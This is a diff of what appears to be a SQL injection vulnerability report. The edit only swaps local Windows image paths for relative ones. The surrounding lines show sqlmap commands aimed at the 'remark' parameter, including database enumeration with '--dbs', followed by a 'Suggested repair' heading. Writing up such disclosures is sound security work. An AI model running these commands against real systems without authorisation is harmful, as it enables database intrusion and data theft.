@@ -134,7 +134,7 @@ remark=1&submit=
 python sqlmap.py -r 1.txt -p remark
 ```
 
-![image-20250605123225477](C:\Users\Rmyxx\AppData\Roaming\Typora\typora-user-images\image-20250605123225477.png)
+![image-20250605123225477](image-20250605123225477.png)          
 
 ```
 python sqlmap.py -r 1.txt -p remark --dbs
@@ -142,7 +142,7 @@ python sqlmap.py -r 1.txt -p remark --dbs
 
 
 
-![image-20250605123157464](C:\Users\Rmyxx\AppData\Roaming\Typora\typora-user-images\image-20250605123157464.png)
+![image-20250605123157464](image-20250605123157464.png)                
 
 # Suggested repair
 
